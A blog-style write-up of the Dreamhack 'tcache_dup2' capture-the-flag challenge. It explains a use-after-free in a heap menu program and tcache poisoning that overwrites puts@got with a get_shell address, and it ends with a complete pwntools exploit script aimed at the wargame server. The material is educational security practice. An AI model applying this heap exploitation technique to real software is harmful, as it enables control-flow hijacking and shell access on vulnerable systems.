+++
date = '2026-05-22'
draft = false
title = 'Dreamhack tcache_dup2 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(tcache_dup2)의 바이너리와 소스 코드가 주어집니다.
취약점을 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

We have three options, create, modify and delete.

```c
      puts("1. Create heap");
      puts("2. Modify heap");
      puts("3. Delete heap");
      printf("> ");
```

The challenge uses a `ptr` table in the `.bss`. The delete function frees the chunks but doesn't clear out the `ptr` table.

```c
if ( !*((_QWORD *)&ptr + v1) )
    exit(0);
  free(*((void **)&ptr + v1));
```

And the modify function doesn't check anything either. 

```c
v3 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%ld", &v2);
  if ( v2 > 6 )
    exit(0);
  printf("Size: ");
  __isoc99_scanf("%ld", &nbytes);
  if ( nbytes > 0x10 )
    exit(0);
  printf("Data: ");
  read(0, *((void **)&ptr + v2), nbytes);
```

## Identifying the vulnerabilities

Not only that, we also have a `get_shell` function provided for us.

This libc version does have double free protections. But, as I highlighted earlier, we can modify freed chunks. So this is a UAF type vulnerability.

First, I created a chunk, free-d it, and then modified its `fd` to point to `puts@got`. 

Now, after malloc-ing something in the place of A, the tcache bins head was successfully overwritten with our evil address after the modify.

There was a problem though; On the next tchache-sized malloc, a chunk would get carved out of the wilderness, not the tcache bins. Strange, right? But that's because the tchache bins was *empty*. Since we did a malloc and then a free, then another malloc, it didn't matter what the head was. Because everything was in order.

So we needed another slot in the tcache bins, a dummy value, so that it wouldn't think the tcache bins is empty and disregard our crafted `fd`.

Basically, what I did:

- create A

- create B

- free B (tcache bins: `B`)

- free A (tcache bins: `B ⬅️ A`)

- modify A (A's `fd` becomes `puts@got` instead of `B`)

- malloc chunk (tcache bins: `puts@got`)

- malloc getshell!


![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf =  ELF("./tcache_dup2_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:16590'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#getshell func
getshell = 0x401530

#ptr table
#.bss: 0x4040A0 ptr  

#gdb.attach(p)

def create(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    #size
    p.recvuntil(b": ")
    p.sendline(size)
    #data
    p.recvuntil(b": ")
    p.send(data)

#up to 0x10 bytes only
def modify(idx, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(idx)
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.send(data)

def delete(idx):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    
    p.recvuntil(b": ")
    p.sendline(idx)


create(b"24", b"AAAA")
create(b"24", b"BBBB")
#modify available chiar si pe freed chunks(?)

#so its going to think that the tcache isnt empty. if we free then malloc, its going to think its empty
#so now we create another dummy entrance, 1 
delete(b"1")
#this will be the head though
delete(b"0")

puts_got = elf.got[b'puts']
modify(b"0", b"16", p64(puts_got))

#this will write inside the A chunk (head), and now FD->evil
create(b"24", b"CCCC")
#one more slot left (for B), but head pointing to evil not B.
create(b"24", p64(getshell))

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/tchache_dup2.py)**.
